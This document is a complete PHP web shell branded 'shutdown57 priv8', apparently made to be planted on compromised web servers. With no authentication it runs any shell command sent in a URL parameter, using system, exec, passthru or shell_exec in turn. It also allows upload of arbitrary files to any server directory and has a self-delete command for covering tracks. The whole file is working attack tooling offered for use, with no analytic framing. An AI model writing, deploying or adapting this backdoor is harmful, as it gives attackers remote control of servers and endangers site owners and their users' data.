<!DOCTYPE html>
<html>
<head>
	<title>$ shutdown57 priv8 $</title>
	<meta charset="utf-8">
	<meta name="author" content="shutdown57">
</head>
<body>
<style type="text/css">html,body{background:#333;color: #f00;}input{color:#eee;background: transparent;border:0;padding:6px}.content{width:70%;margin: 0 auto;}</style>
<script type="text/javascript">
	function s57_runCommand(command)
	{
		history.pushState(null,null,'?command='+command);

		var ajax =new XMLHttpRequest();
		ajax.onreadystatechange = function()
		{
			if(this.readyState == 4 && this.status == 200)
			{
				/*var response = this.responseText;
				var res = response.document.getElementById('res');*/
				document.getElementById('area').innerHTML=this.responseText;
			}
		};
		ajax.open('GET','?command='+command,true);
		ajax.send(); 
	}
</script>
<div class="content">
<div id="head">
<center><a href="?" style="text-decoration: none;color: #eee"><h1>$ shutdown57 priv8 $</h1></a></center>
<hr>
</div>
<?php

function s57_phpCommand($cmd) { 

if($cmd == "--help" || $cmd == "-h")
{
$help = array("./upload" => "Untuk mengunggah file ke server.",
			  "./destroy" => "Untuk menghapus file ini. (".$_SERVER['PHP_SELF'].") ");

echo "[+] Addtional command [shutdown57] <br><br>";
foreach($help as $h=>$k)
{
	echo "<font color=#fff>".$h."</font> => <font color=#fff>".$k."</font><br>";
}
}

if(function_exists('system')) {     
    @ob_start();    
    @system($cmd);    
    $exect = @ob_get_contents();    
    @ob_end_clean();    
    return $exect;  
  } elseif(function_exists('exec')) {     
    @exec($cmd,$results);     
    $exect = "";    
    foreach($results as $result) {      
      $exect .= $result;    
    } return $exect;  
  } elseif(function_exists('passthru')) {     
    @ob_start();    
    @passthru($cmd);    
    $exect = @ob_get_contents();    
    @ob_end_clean();    
    return $exect;  
  } elseif(function_exists('shell_exec')) {     
    $exect = @shell_exec($cmd);     
    return $exect;  
  } 
}

function Jupl($a,$b){
  if(function_exists('move_uploaded_file')){
    $upl = move_uploaded_file($a,$b);
  }elseif (function_exists('copy')) { 
    $upl = copy($a,$b);
  }
    return $upl; 
  }
 function array_upload($file){ 
    $file_ary = array(); 
    $file_count = count($file['name']);
     $file_key = array_keys($file); 
     for($i=0;$i<$file_count;$i++) { 
      foreach($file_key as $val) { 
        $file_ary[$i][$val] = $file[$val][$i]; 
      } 
    } 
    return $file_ary;
  }


if(empty($_GET['command']))
{
	?>shutdown57@<?=$_SERVER['HTTP_HOST'];?> $<input type="text" name="command" placeholder="What can i do for u? --help" id="command" style="width:80%" onchange="s57_runCommand(this.value)">
<?php
}else{
if(!preg_match("/.\//",$_GET['command'])){

echo '</div><div id="area">';
echo '<pre>'.s57_phpCommand($_GET['command']).'</pre>';
echo "</div>";

}else{

if($_GET['command'] == './upload')
{
?>    <center>
    <form method="post" enctype="multipart/form-data">
      <label>Select file ::</label>
      <input type="file" name="jfilez[]" class="input_m" multiple="">
      <label>Upload to ::</label>
      <input type="text" name="jdirz" value="<?=getcwd();?>" class="input_m"><input type="submit" name="upload" value="Upload !" class="submit_m">
    </form>
  </center><?php
  if(isset($_POST['upload'])){
      echo "<pre>";
      $file_up = array_upload($_FILES['jfilez']);
      foreach($file_up as $filup){
        if(Jupl($filup['tmp_name'],$_POST['jdirz']."/".$filup['name'])){
          $res_upl.="Successfuly Upload file : ".$_POST['jdirz']."/".$filup['name'];
        }else{
          $res_upl.="Failed to upload file !";}
        }
        echo $res_upl."<br/></pre>";
      }

}elseif($_GET['command'] == './destroy')
{
	unlink(getcwd().$_SERVER['PHP_SELF']);
	echo '<meta http-equiv="refresh" content="0;url=??">';
}

}

}
?>
<div id="area"></div>

</div>
</body>
</html>